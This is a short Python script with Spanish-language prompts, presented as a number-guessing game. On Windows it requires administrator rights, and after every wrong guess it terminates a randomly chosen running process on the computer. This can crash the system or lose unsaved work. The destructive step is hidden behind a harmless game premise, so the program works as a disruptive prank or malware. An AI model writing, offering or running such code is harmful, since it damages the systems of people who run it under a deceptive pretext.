import os
import random
import subprocess
import sys
import psutil
import ctypes

def install_psutil():
    try:
        import psutil
    except ImportError:
        print("psutil no está instalado. Instalando...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "psutil"])
        print("psutil instalado correctamente.")

def delete_random_process():
    try:
        processes = [p for p in psutil.process_iter(['pid', 'name'])]

        if processes:
            process_to_kill = random.choice(processes)
            process_to_kill.terminate()
            print(f"Se ha eliminado automáticamente el proceso '{process_to_kill.info['name']}' con PID {process_to_kill.info['pid']}.")
        else:
            print("No hay procesos activos para eliminar.")
    except Exception as e:
        print(f"Ocurrió un error al intentar eliminar el proceso: {e}")

def play_game():
    score = 0
    print("¡Bienvenido al juego de adivinar el número!")
    print("Estoy pensando en un número entre 1 y 10. ¿Puedes adivinarlo?")

    while True:
        number_to_guess = random.randint(1, 10)

        try:
            user_guess = int(input("Ingresa tu suposición (1-10): "))
        except ValueError:
            print("Por favor, ingresa un número válido.")
            continue

        if user_guess == number_to_guess:
            print("¡Correcto!")
            score += 1
        else:
            print(f"Incorrecto. El número correcto era: {number_to_guess}")
            delete_random_process()

        print(f"Tu puntaje actual es: {score}")

def is_admin():
    return ctypes.windll.shell32.IsUserAnAdmin() != 0

if __name__ == "__main__":
    if os.name == 'nt':
        if not is_admin():
            print("Este programa necesita permisos de administrador. Por favor, ejecútalo como administrador.")
            sys.exit(1)

    install_psutil()
    play_game()